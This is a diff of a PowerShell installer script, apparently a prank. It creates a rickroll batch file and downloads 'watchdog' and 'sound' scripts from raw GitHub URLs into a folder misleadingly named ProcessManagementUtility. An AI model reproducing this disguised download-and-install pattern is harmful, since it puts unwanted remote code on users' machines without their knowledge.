@@ -7,17 +7,17 @@ cd "C:\Program Files\ProcessManagementUtility"
 echo "curl ASCII.live/can-you-hear-me" > rickroll.bat
 
 # watchdog0.ps1
-$url = "http://example.com/path/to/file"    #? replace with github url
+$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog0.ps1"    #? replace with github url
 $output = "C:\Program Files\ProcessManagementUtility\watchdog0.ps1"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 # watchdog1.ps1
-$url = "http://example.com/path/to/file"    #? replace with github url
+$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog1.ps1"    #? replace with github url
 $output = "C:\Program Files\ProcessManagementUtility\watchdog1.ps1"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 # sound.ps1
-$url = "http://example.com/path/to/file"    #? replace with github url
+$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/sound.ps1"    #? replace with github url
 $output = "C:\Program Files\ProcessManagementUtility\sound.ps1"
 Invoke-WebRequest -Uri $url -OutFile $output
 
